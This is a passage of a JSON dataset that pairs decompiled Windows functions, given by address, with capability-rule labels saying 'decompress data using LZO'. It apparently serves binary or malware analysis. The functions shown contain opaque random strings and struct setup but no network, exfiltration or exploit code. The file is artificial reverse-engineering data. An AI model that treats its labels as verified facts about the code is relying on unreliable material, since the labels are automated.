            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404025(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4504a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"segkmaoflowujumskzgsfngoiaypftaoyewtdxlgqlhmafdlyxwssuchxzbvcgpgcttjcnuzhciaalocsidrdg\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 198
    },
    "0040404d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0040404d(void)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar8;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uchar auStack412 [24];\n    uchar auStack388 [64];\n    uint uStack324;\n    uchar *var_13ch;\n    uint *var_138h;\n    uchar *var_134h;\n    uchar *var_130h;\n    uint *var_12ch;\n    uchar *var_128h;\n    uint *var_124h;\n    uchar *var_120h;\n    uchar *var_11ch;\n    uchar *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    uchar *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    uint *var_f4h;\n    uchar *var_f0h;\n    uchar *var_ech;\n    uint *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    uchar *var_dch;\n    uchar *var_d8h;\n    uint *var_d4h;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uint *var_b8h;\n    uchar *var_b4h;\n    uint *var_b0h;\n    uchar *var_ach;\n    uchar *var_a8h;\n    uchar *var_a4h;\n    uchar *var_a0h;\n    uint *var_9ch;\n    uchar *var_98h;\n    uint *var_94h;\n    uchar *var_90h;\n    int32_t *var_8ch;\n    uchar *var_88h;\n    int32_t *var_84h;\n    uchar *var_80h;\n    uchar *var_7ch;\n    uchar *var_78h;\n    uchar *var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint *var_5ch;\n    uchar *var_58h;\n    uchar *var_54h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar7;\n    uint *puVar9;\n    uchar *puVar10;\n    \n    var_1ch = &fcn.0040404d::var_13ch;\n    var_5ch = &fcn.0040404d::var_13ch;\n    var_10h = 0xffffffff;\n    var_14h = 0x418130;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040404d::var_18h;\n    uStack324 = 0x40fdb5;\n    fcn.004040a7();\n    var_6ch = var_64h + 0x20;\n    uStack324 = 0x40fdc3;\n    fcn.004040a7();\n    var_68h = var_64h + 0x54;\n    uStack324 = 0x40fdd1;\n    fcn.004040a7();\n    var_60h = var_64h + 0x6c;\n    uStack324 = 0x40fddf;\n    fcn.004040a7();\n    var_58h = &stack0xfffffe64;\n    var_54h = &stack0xfffffe7c;\n    var_10h = 3;\n    fcn.00401e79(\"lfpxelwprjvwuixxuliazvojjfjmgrpqxonbffrfuzolssacgbkmfrlxznpgzwov\");\n    var_10h = 0x15;\n    arg_8h = \"kmntmqhuokkyozttbsyiwmcpbwgkaapykqvilsfkdzp\";\n    fcn.00401e79(\"kmntmqhuokkyozttbsyiwmcpbwgkaapykqvilsfkdzp\");\n    puVar2 = var_58h;\n    *(var_58h + 0x34) = 0x40e806e0;\n    *(puVar2 + 0x30) = 0;\n    *(puVar2 + 0x38) = 0x9c9;\n    *(puVar2 + 0x3c) = 0x670;\n    *(puVar2 + 0x44) = 0x40e49600;\n    *(puVar2 + 0x40) = 0;\n    *(puVar2 + 0x4c) = 0x40e18de0;\n    *(puVar2 + 0x48) = 0;\n    *(puVar2 + 0x54) = 0x40eb4500;\n    *(puVar2 + 0x50) = 0;\n    *(puVar2 + 0x58) = 0xd1b;\n    var_10h = 3;\n    fcn.004010aa(arg_8h);\n    puVar3 = var_5ch;\n    var_7ch = var_5ch;\n    *(var_5ch + -4) = var_5ch;\n    var_78h = puVar3 + -0x44;\n    var_74h = puVar3 + -0x28;\n    *(puVar3 + -0x48) = \"vjzrngeqibbkfapycozhowfqeexymlxkaetsgkrpzeywzxkhqvyfltljjrpawvpgrjuumjkgrevpoikkstrmm\";\n    *(puVar3 + -0x4c) = 0x40febe;\n    fcn.00401e79(*(puVar3 + -0x48));\n    var_10h = 0x14;\n    *(puVar3 + -0x4c) = \"euwsjavxdvbjcnipmnefdcavkbrxxiztzelouvzywxryqkcgamrcdaebafgtojkesgrnajvnhefswfmiubtrhjiveqkp\";\n    *(puVar3 + -0x50) = 0x40fedd;\n    fcn.00401e79(*(puVar3 + -0x4c));\n    puVar2 = var_78h;\n    var_78h[0x18] = 1;\n    *(puVar2 + 0x38) = 0x40d97c00;\n    *(puVar2 + 0x34) = 0;\n    *(puVar2 + 0x3c) = 0x98d;\n    puVar2[0x40] = 1;\n    var_10h = 3;\n    *(puVar3 + -0x50) = 0x40ff11;\n    fcn.004054ca(*(puVar3 + -0x4c));\n    puVar2 = var_7ch;\n    var_88h = var_7ch;\n    *(var_7ch + -4) = var_7ch;\n    var_84h = puVar2 + -0x74;\n    var_80h = puVar2 + -0x20;\n    *(puVar2 + -0x78) = \"xlsmbzlwvptjtzqfeqekdmdifqfolfnqzozbqcczpslzcrpajbhsdytjrunpeqisknuedmksuipeddkmmmcueylcemdsr\";\n    *(puVar2 + -0x7c) = 0x40ff49;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_8ch = var_84h + 7;\n    var_10h = 0x12;\n    *(puVar2 + -0x7c) = 0x544c65;\n    *(puVar2 + -0x80) = 0x40ff74;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    var_10h = 0x13;\n    *(puVar2 + -0x80) = \"qsgwuzthwcbk\";\n    *(puVar2 + -0x84) = 0x40ff99;\n    fcn.00401e79(*(puVar2 + -0x80));\n    piVar4 = var_84h;\n    *var_84h = &fcn.0040404d::var_38h;\n    piVar4[0xe] = 0x40d38240;\n    piVar4[0xd] = 0;\n    piVar4[0x10] = 0x40d5c780;\n    piVar4[0xf] = 0;\n    piVar4[0x11] = 0x59a;\n    piVar4[0x13] = 0x40c33b00;\n    piVar4[0x12] = 0;\n    *(piVar4 + 0x14) = 1;\n    piVar4[0x1c] = 0x40d1b300;\n    piVar4[0x1b] = 0;\n    var_10h = 3;\n    *(puVar2 + -0x84) = 0x40fffb;\n    fcn.00403b1b(*(puVar2 + -0x80));\n    puVar2 = var_88h;\n    *(var_88h + -4) = 0x410010;\n    fcn.00403b02();\n    var_98h = puVar2;\n    var_94h = puVar2 + -0x48;\n    var_90h = puVar2 + -0x18;\n    *(puVar2 + -0x4c) =\n         \"cocjlmoqfdbbwazqdnpwqrgblgaazweklivnnhkwaysixnpjbsmdhssjtsvqcsfgdvawjhcwydmblyfrcdhlgssmmvayzwamr\";\n    *(puVar2 + -0x50) = 0x41003e;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    var_10h = 0x11;\n    *(puVar2 + -0x50) = \"ssogzrzjhfci\";\n    *(puVar2 + -0x54) = 0x410063;\n    fcn.00401e79(*(puVar2 + -0x50));\n    puVar1 = var_94h;\n    var_94h[1] = 0x40b1f900;\n    *puVar1 = 0;\n    puVar1[8] = 0xc19;\n    puVar1[9] = 0xb95;\n    *(puVar1 + 10) = 1;\n    *(puVar1 + 0xb) = 0;\n    *(puVar2 + -0x54) = 0x410099;\n    fcn.004040ca(*(puVar2 + -0x50));\n    puVar2 = var_98h;\n    var_a0h = var_98h;\n    *(var_98h + -4) = var_98h;\n    var_9ch = puVar2 + -0x44;\n    var_10h = 3;\n    *(puVar2 + -0x48) = \"knyawknileuwvcryqrbfftfjcffgpubchabxzxpujfzbpdgjeno\";\n    *(puVar2 + -0x4c) = 0x4100d1;\n    fcn.00401e79(*(puVar2 + -0x48));\n    puVar1 = var_9ch;\n    *var_9ch = 0xffc;\n    puVar1[1] = 0x203;\n    *(puVar1 + 2) = 0;\n    puVar1[4] = 0x40d04b40;\n    puVar1[3] = 0;\n    puVar1[5] = 0x119a;\n    puVar1[7] = 0x40c46f80;\n    puVar1[6] = 0;\n    *(puVar1 + 0xe) = 0;\n    puVar1[0x10] = 0x40e705c0;\n    puVar1[0xf] = 0;\n    *(puVar2 + -0x4c) = 0x41012a;\n    fcn.0040505b(*(puVar2 + -0x48));\n    puVar3 = var_a0h;\n    var_a8h = var_a0h;\n    *(var_a0h + -4) = var_a0h;\n    var_a4h = puVar3 + -0x28;\n    *(puVar3 + -0x2c) = \"dwutooomezheofjerkimghwpshxibwnodqkglrdtxdfeibmyorrar\";\n    *(puVar3 + -0x30) = 0x410160;\n    fcn.00401e79(*(puVar3 + -0x2c));\n    puVar2 = var_a4h;\n    *var_a4h = 1;\n    puVar2[0x1c] = 0;\n    puVar2[0x20] = 0;\n    puVar2[0x24] = 0;\n    *(puVar3 + -0x30) = 0x410182;\n    fcn.00403afd(*(puVar3 + -0x2c));\n    puVar2 = var_a8h;\n    var_b4h = var_a8h;\n    *(var_a8h + -4) = var_a8h;\n    var_b0h = puVar2 + -0x60;\n    var_ach = puVar2 + -0x18;\n    *(puVar2 + -100) = \"nifuffzgfcmudpqvcmelnnrwzseduwfhqpvczlwhxgcpnwpflurioimeqimbiiqefaxb\";\n    *(puVar2 + -0x68) = 0x4101c0;\n    fcn.00401e79(*(puVar2 + -100));\n    var_b8h = var_b0h + 10;\n    var_10h = 0xf;\n    *(puVar2 + -0x68) = \"fdfvrmtmhqcrj\";\n    *(puVar2 + -0x6c) = 0x4101eb;\n    fcn.00401e79(*(puVar2 + -0x68));\n    var_10h = 0x10;\n    *(puVar2 + -0x6c) = \"nkwtjmbblfhijqepwrjxmjdcyxjf\";\n    *(puVar2 + -0x70) = 0x410210;\n    fcn.00401e79(*(puVar2 + -0x6c));\n    puVar1 = var_b0h;\n    *var_b0h = 0x116c;\n    puVar1[1] = 0x4d2;\n    puVar1[3] = 0x40d34c00;\n    puVar1[2] = 0;\n    *(puVar1 + 0x10) = 1;\n    *(puVar1 + 0x11) = 1;\n    var_10h = 3;\n    *(puVar2 + -0x70) = 0x41024d;\n    fcn.00403567(*(puVar2 + -0x6c));\n    puVar3 = var_b4h;\n    var_c4h = var_b4h;\n    *(var_b4h + -4) = var_b4h;\n    var_c0h = puVar3 + -0x40;\n    var_bch = puVar3 + -0x1c;\n    *(puVar3 + -0x44) = \"clgzxuotnmaipswfocq\";\n    *(puVar3 + -0x48) = 0x410289;\n    fcn.00401e79(*(puVar3 + -0x44));\n    var_10h = 0xe;\n    *(puVar3 + -0x48) = \"rumcndspgibaugisjglzugemr\";\n    *(puVar3 + -0x4c) = 0x4102ab;\n    fcn.00401e79(*(puVar3 + -0x48));\n    puVar2 = var_c0h;\n    var_c0h[0x18] = 1;\n    *(puVar2 + 0x20) = 0x40b14700;\n    *(puVar2 + 0x1c) = 0;\n    *(puVar2 + 0x3c) = 0x1549;\n    var_10h = 3;\n    *(puVar3 + -0x4c) = 0x4102de;\n    fcn.004017e4(*(puVar3 + -0x48));\n    puVar3 = var_c4h;\n    var_cch = var_c4h;\n    *(var_c4h + -4) = var_c4h;\n    var_c8h = puVar3 + -0x28;\n    *(puVar3 + -0x2c) = \"jsnwpwenoicisetvsptwjgbchacmhznnfaqabensfcmrkmkzxr\";\n    *(puVar3 + -0x30) = 0x410311;\n    fcn.00401e79(*(puVar3 + -0x2c));\n    puVar2 = var_c8h;\n    *(var_c8h + 0x1c) = 0x40e08d40;\n    *(puVar2 + 0x18) = 0;\n    *(puVar2 + 0x24) = 0x40e035a0;\n    *(puVar2 + 0x20) = 0;\n    *(puVar3 + -0x30) = 0x410340;\n    fcn.00405a38(*(puVar3 + -0x2c));\n    puVar2 = var_cch;\n    *(var_cch + -4) = 0x410357;\n    fcn.00402db5();\n    var_d8h = puVar2;\n    var_d4h = puVar2 + -0x50;\n    var_d0h = puVar2 + -0x34;\n    *(puVar2 + -0x54) = \"fvflkhniciithvkwnwvqvnjcqxp\";\n    *(puVar2 + -0x58) = 0x41038a;\n    fcn.00401e79(*(puVar2 + -0x54));\n    var_10h = 0xd;\n    *(puVar2 + -0x58) = \"gbbdnumnaizvqsbqfgltsdlurqhbpkrcpsjrogjseoooocswcmuvzjwrndnoqezpkppypajoyzkhivtuagwoxtvomk\";\n    *(puVar2 + -0x5c) = 0x4103af;\n    fcn.00401e79(*(puVar2 + -0x58));\n    puVar1 = var_d4h;\n    *var_d4h = 0x1577;\n    puVar1[0xe] = 0x40e2ce20;\n    puVar1[0xd] = 0;\n    puVar1[0x10] = 0x40d82180;\n    puVar1[0xf] = 0;\n    *(puVar1 + 0x11) = 1;\n    *(puVar1 + 0x12) = 0;\n    puVar1[0x13] = 0x770;\n    var_10h = 3;\n    *(puVar2 + -0x5c) = 0x4103fa;\n    fcn.00406578(*(puVar2 + -0x58));\n    puVar3 = var_d8h;\n    puVar5 = var_d8h + -4;\n    var_e0h = var_d8h + -4;\n    *(var_d8h + -4) = &fcn.0040404d::var_50h;\n    *(puVar3 + -8) = 0x410419;\n    fcn.00401d2a(*puVar5);\n    *(puVar3 + -8) = 0x410426;\n    fcn.00403b02();\n    var_dch = puVar3 + -0x50;\n    *(puVar3 + -0x54) = \"ragrokuiionshfgfywavfdwxuylnhkfvmeeoeqffmdsiaeeyhmprtabdxtrdwfypsuyuveiwaoyh\";\n    *(puVar3 + -0x58) = 0x41044e;\n    fcn.00401e79(*(puVar3 + -0x54));\n    puVar2 = var_dch;\n    *var_dch = 1;\n    *(puVar2 + 8) = 0x40e41980;\n    *(puVar2 + 4) = 0;\n    *(puVar2 + 0xc) = 0xed6;\n    *(puVar2 + 0x2c) = 0x40e635a0;\n    *(puVar2 + 0x28) = 0;\n    *(puVar2 + 0x34) = 0x40c7ee00;\n    *(puVar2 + 0x30) = 0;\n    puVar2[0x38] = 0;\n    *(puVar2 + 0x40) = 0x40883000;\n    *(puVar2 + 0x3c) = 0;\n    *(puVar2 + 0x48) = 0x40e2c8c0;\n    *(puVar2 + 0x44) = 0;\n    *(puVar3 + -0x58) = 0x4104b5;\n    fcn.004060c3(*(puVar3 + -0x54));\n    puVar2 = var_e0h;\n    var_ech = var_e0h;\n    *(var_e0h + -4) = var_e0h;\n    var_e8h = puVar2 + -0x48;\n    var_e4h = puVar2 + -0x18;\n    *(puVar2 + -0x4c) = \"rzumxtvktbpcqwgwseqtzkguippbitrtebcnniepbgqyvugjscjoybnsxfboesdnr\";\n    *(puVar2 + -0x50) = 0x4104ec;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    var_10h = 0xc;\n    *(puVar2 + -0x50) = \"kpjs\";\n    *(puVar2 + -0x54) = 0x410511;\n    fcn.00401e79(*(puVar2 + -0x50));\n    puVar1 = var_e8h;\n    *var_e8h = 0xed6;\n    puVar1[1] = 0x10d8;\n    *(puVar1 + 8) = 1;\n    puVar1[10] = 0x40d750c0;\n    puVar1[9] = 0;\n    *(puVar1 + 0xb) = 1;\n    var_10h = 3;\n    *(puVar2 + -0x54) = 0x41054e;\n    fcn.00403102(*(puVar2 + -0x50));\n    puVar2 = var_ech;\n    var_f8h = var_ech;\n    *(var_ech + -4) = var_ech;\n    var_f4h = puVar2 + -0x44;\n    var_f0h = puVar2 + -0x1c;\n    *(puVar2 + -0x48) = 0x544faf;\n    *(puVar2 + -0x4c) = 0x41058a;\n    fcn.00401e79(*(puVar2 + -0x48));\n    var_10h = 0xb;\n    *(puVar2 + -0x4c) = \"icxlraddtyzeecxuvkgszjyiphaucupayfxhfo\";\n    *(puVar2 + -0x50) = 0x4105af;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    puVar1 = var_f4h;\n    var_f4h[1] = 0x40cfa200;\n    *puVar1 = 0;\n    puVar1[2] = 0x41a;\n    puVar1[9] = 0xc37;\n    puVar1[0x10] = 0x2098;\n    var_10h = 3;\n    *(puVar2 + -0x50) = 0x4105eb;\n    fcn.00403391(*(puVar2 + -0x4c));\n    puVar3 = var_f8h;\n    var_104h = var_f8h;\n    *(var_f8h + -4) = var_f8h;\n    var_100h = puVar3 + -0x48;\n    var_fch = puVar3 + -0x30;\n    *(puVar3 + -0x4c) = \"ajehjjm\";\n    *(puVar3 + -0x50) = 0x410627;\n    fcn.00401e79(*(puVar3 + -0x4c));\n    var_10h = 10;\n    *(puVar3 + -0x50) = \"bxqrusfbgeexmxbynphqovfxtdbdlvp\";\n    *(puVar3 + -0x54) = 0x410649;\n    fcn.00401e79(*(puVar3 + -0x50));\n    puVar2 = var_100h;\n    var_100h[0x30] = 0;\n    puVar2[0x34] = 0;\n    *(puVar2 + 0x38) = 0x170b;\n    *(puVar2 + 0x3c) = 0x62d;\n    *(puVar2 + 0x44) = 0x40d85100;\n    *(puVar2 + 0x40) = 0;\n    var_10h = 3;\n    *(puVar3 + -0x54) = 0x410687;\n    fcn.00404a3e(*(puVar3 + -0x50));\n    puVar2 = var_104h;\n    puVar6 = var_104h + -8;\n    puVar7 = var_104h + -8;\n    var_110h = var_104h + -8;\n    *(var_104h + -4) = 0xd5b;\n    *puVar6 = 0x668;\n    *(puVar2 + -0xc) = 0x4106ae;\n    fcn.004010e6(*puVar7, *(puVar2 + -4));\n    var_10ch = puVar2 + -0x84;\n    var_108h = puVar2 + -0x20;\n    *(puVar2 + -0x88) = \"ygdngricjhume\";\n    *(puVar2 + -0x8c) = 0x4106de;\n    fcn.00401e79(*(puVar2 + -0x88));\n    var_114h = var_10ch + 0x4c;\n    var_10h = 6;\n    *(puVar2 + -0x8c) = \"dtwmrstoyusjowsqjvpbhcrmxmwrrjlsqrlvfjowllpbmcrfprgupydftqveydxvdmmdmrqmxvvfslp\";\n    *(puVar2 + -0x90) = 0x410709;\n    fcn.00401e79(*(puVar2 + -0x8c));\n    var_118h = var_10ch + 0x34;\n    var_10h = 7;\n    *(puVar2 + -0x90) = \"tyloohclddtltiumzcuijhactiofbmv\";\n    *(puVar2 + -0x94) = 0x410734;\n    fcn.00401e79(*(puVar2 + -0x90));\n    var_11ch = var_10ch + 0x1c;\n    var_10h = 8;\n    *(puVar2 + -0x94) = \"opexsrpseenltapydzun\";\n    *(puVar2 + -0x98) = 0x41075f;\n    fcn.00401e79(*(puVar2 + -0x94));\n    var_10h = 9;\n    *(puVar2 + -0x98) = \"hswnmulbshrunskatqxdkxbfjjjuphxrdiqeinkwlesnkvupxaoxkuqweznjicxjaxmjuzkjhguontksvloxlnvt\";\n    *(puVar2 + -0x9c) = 0x410784;\n    fcn.00401e79(*(puVar2 + -0x98));\n    *var_10ch = 0;\n    var_10h = 3;\n    *(puVar2 + -0x9c) = 0x4107a1;\n    fcn.00402c2a(*(puVar2 + -0x98));\n    puVar2 = var_110h;\n    var_128h = var_110h;\n    *(var_110h + -4) = var_110h;\n    var_124h = puVar2 + -0x74;\n    var_120h = puVar2 + -0x30;\n    *(puVar2 + -0x78) = \"bqsjfnlndcmbencetnwtjytmddpshtjrzccjqupmtzpmiolagpmkdrifxr\";\n    *(puVar2 + -0x7c) = 0x4107dd;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_12ch = var_124h + 9;\n    var_10h = 4;\n    *(puVar2 + -0x7c) = \"asvx\";\n    *(puVar2 + -0x80) = 0x410808;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    var_10h = 5;\n    *(puVar2 + -0x80) =\n         \"rzganjyslkamnwjfzdlmamifthcvxgrzmqrfqalbmxtdqmmcupifgfchgjpjqukvpeqjsfuyicrlqnwwnwgtijpnmmcixvbvl\";\n    *(puVar2 + -0x84) = 0x41082d;\n    fcn.00401e79(*(puVar2 + -0x80));\n    puVar1 = var_124h;\n    var_124h[1] = 0x40ba0600;\n    *puVar1 = 0;\n    *(puVar1 + 8) = 1;\n    puVar1[0x10] = 0x40af4a00;\n    puVar1[0xf] = 0;\n    puVar1[0x18] = 0x40efbea0;\n    puVar1[0x17] = 0;\n    puVar1[0x1a] = 0x40d298c0;\n    puVar1[0x19] = 0;\n    puVar1[0x1c] = 0x40cda580;\n    puVar1[0x1b] = 0;\n    var_10h = 3;\n    *(puVar2 + -0x84) = 0x410890;\n    fcn.00403a94(*(puVar2 + -0x80));\n    puVar3 = var_128h;\n    puVar8 = var_128h + -0x10;\n    puVar9 = var_128h + -0x10;\n    var_134h = var_128h + -0x10;\n    puVar10 = var_128h + -0x10;\n    *(var_128h + -4) = 0x40a03e00;\n    *(puVar3 + -8) = 0;\n    *(puVar3 + -0xc) = 1;\n    *puVar8 = 0;\n    *(puVar3 + -0x14) = 0x4108c7;\n    fcn.00405cc2(*puVar9, *(puVar3 + -0xc), *(puVar3 + -8));\n    *(puVar3 + -0x14) = puVar10;\n    var_130h = puVar3 + -0x38;\n    *(puVar3 + -0x3c) = \"vysighitgflsprncjcsppmfplytkcpea\";\n    *(puVar3 + -0x40) = 0x4108f2;\n    fcn.00401e79(*(puVar3 + -0x3c));\n    puVar2 = var_130h;\n    *(var_130h + 0x1c) = 0x40e7de00;\n    *(puVar2 + 0x18) = 0;\n    puVar2[0x20] = 1;\n    *(puVar2 + 0x24) = 0x38e;\n    *(puVar3 + -0x40) = 0x41091e;\n    fcn.004067da(*(puVar3 + -0x3c));\n    puVar2 = var_134h;\n    var_13ch = var_134h;\n    *(var_134h + -4) = var_134h;\n    var_138h = puVar2 + -0x44;\n    *(puVar2 + -0x48) = \"bxqzlzpzlkyypjedbbvrhavrdhtxmnicvaoca\";\n    *(puVar2 + -0x4c) = 0x410954;\n    fcn.00401e79(*(puVar2 + -0x48));\n    puVar1 = var_138h;\n    *var_138h = 0x5e9;\n    *(puVar1 + 1) = 1;\n    *(puVar1 + 2) = 0;\n    puVar1[4] = 0x40dc2f00;\n    puVar1[3] = 0;\n    puVar1[5] = 0x132a;\n    puVar1[6] = 0x1d3;\n    puVar1[0xe] = 0x40e9f5c0;\n    puVar1[0xd] = 0;\n    puVar1[0xf] = 0x13c8;\n    *(puVar1 + 0x10) = 0;\n    *(puVar2 + -0x4c) = 0x4109aa;\n    fcn.0040628f(*(puVar2 + -0x48));\n    *in_FS_OFFSET = var_18h;\n    return var_70h;\n}\n",
        "token_count": 8156
    },
    "004040a7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004040a7(uint param_1)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004010b9();\n    fcn.00404ea3(0x533627);\n    fcn.00401f3c();\n    return param_1;\n}\n",
        "token_count": 77
    },
    "004040e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040e8(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004045fc(arg_8h);\n    *in_ECX = vtable.std::runtime_error.0;\n    return;\n}\n",
        "token_count": 71
    },
    "00404110": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404110(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450b80;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 2;\n    fcn.00401e79(\"xidayzfnhs\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 203
    },
    "00404435": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.00404435(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4181f0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"qnnonbmqwpaxjkkifinjkoalenqvjtasnliasydin\");\n    uStack24 = 0;\n    fcn.00401e79(\"mujhjnajzzdkemtkeuofjgfkjbpieescvndedhcfyywjpuiceyzfbhdfaylwoqfcvurwmajsotghedzyfbuqpihpomtvxvppaww\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x103f;\n}\n",
        "token_count": 246
    },
    "004044e9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004044e9(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a657f:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a657f;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 431
    },
    "004044ee": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004044ee(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a69cc:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a69cc;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "004045ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004045ac(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450f80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(0x54e9e9);\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 176
    },
    "004048b3": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048b3(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00405d8f(arg_8h);\n    fcn.00404e71(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 91
    },
    "004049a3": {
        "rules": [
